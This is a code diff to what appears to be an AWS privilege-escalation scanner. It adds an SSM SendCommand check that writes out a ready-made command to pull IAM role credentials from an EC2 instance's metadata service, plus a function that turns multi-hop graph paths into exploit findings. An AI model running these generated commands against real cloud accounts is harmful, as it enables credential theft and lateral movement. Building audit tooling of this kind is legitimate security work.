@@ -199,7 +199,52 @@ def check_privesc(permissions: set[str], scan_data: dict) -> list[dict]:
             ['iam:PassRole', 'glue:CreateJob', 'glue:StartJobRun'],
         )
 
+    # --- SSM SendCommand → lateral move via EC2 instance profile ---
+    if _has(permissions, 'ssm:SendCommand'):
+        for region_data in scan_data.get('ec2', {}).values():
+            if not isinstance(region_data, dict) or 'error' in region_data:
+                continue
+            for inst in region_data.get('instances', []):
+                if inst.get('iam_profile') and inst.get('state') == 'running':
+                    inst_id = inst['id']
+                    role_name = inst['iam_profile'].split('/')[-1]
+                    _add(
+                        'SSM:SendCommand', 'CRIT',
+                        f'send shell command to {inst_id} (role: {role_name}) — grab IMDS creds',
+                        f'aws ssm send-command --instance-ids {inst_id} '
+                        f'--document-name AWS-RunShellScript '
+                        f"--parameters 'commands=[\"curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}\"]' "
+                        f'--output text --query "Command.CommandId"',
+                        ['ssm:SendCommand'],
+                    )
+                    break  # one example per region is enough
+            else:
+                continue
+            break
+
     return paths
+
+
+def paths_from_graph(graph_paths: list[list[str]], graph) -> list[dict]:
+    """Convert nx path lists to finding dicts for terminal + Claude output."""
+    import networkx as nx
+    findings = []
+    for path in graph_paths:
+        hops = []
+        for i in range(len(path) - 1):
+            edge = graph.edges[path[i], path[i + 1]]
+            rel = edge.get('relationship', '')
+            hops.append(f"{path[i].split('/')[-1]} --[{rel}]--> {path[i+1].split('/')[-1]}")
+        findings.append({
+            'severity': 'CRIT',
+            'resource': path[0],
+            'finding': f'privesc: multi-hop path to {path[-1].split("/")[-1]}',
+            'technique': 'MultiHop',
+            'exploit_cmd': ' && '.join(hops),
+            'permissions_needed': ['see path'],
+            'path': path,
+        })
+    return findings
 
 
 def _assumable_roles(scan_data: dict, caller_arn: str) -> list[str]:
